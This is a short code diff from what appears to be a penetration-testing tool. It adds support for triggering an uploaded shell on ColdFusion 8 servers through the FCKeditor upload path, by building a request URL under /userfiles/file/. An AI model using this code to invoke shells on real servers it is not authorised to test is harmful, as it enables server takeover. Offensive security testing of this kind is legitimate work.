@@ -4,7 +4,7 @@ from log import LOG
 import utility
 
 
-def invoke(fingerengine, fingerprint):
+def invoke(fingerengine, fingerprint, deployer):
     """
     """
 
@@ -12,7 +12,7 @@ def invoke(fingerengine, fingerprint):
         return invoke_war(fingerengine, fingerprint)
 
     elif fingerengine.service in ["coldfusion"]:
-        return invoke_cf(fingerengine, fingerprint)
+        return invoke_cf(fingerengine, fingerprint, deployer)
 
     else:
         utility.Msg("Platform %s does not support --invoke" % 
@@ -48,7 +48,7 @@ def invoke_war(fingerengine, fingerprint):
                                                   LOG.ERROR)
 
 
-def invoke_cf(fingerengine, fingerprint):
+def invoke_cf(fingerengine, fingerprint, deployer):
     """
     """
 
@@ -58,6 +58,11 @@ def invoke_cf(fingerengine, fingerprint):
         # deployments to 10 require us to trigger a 404
         url = "http://{0}:{1}/CFIDE/ad123.cfm".format(fingerengine.options.ip,
                                                       fingerprint.port)
+    elif fingerprint.version in ["8.0"] and "fck_editor" in deployer.__name__:
+        # invoke a shell via FCKeditor deployer
+        url = "http://{0}:{1}/userfiles/file/{2}".format(fingerengine.options.ip,
+                                                         fingerprint.port,
+                                                         dfile)
     else:
         url = "http://{0}:{1}/CFIDE/{2}".format(fingerengine.options.ip,
                                                fingerprint.port,
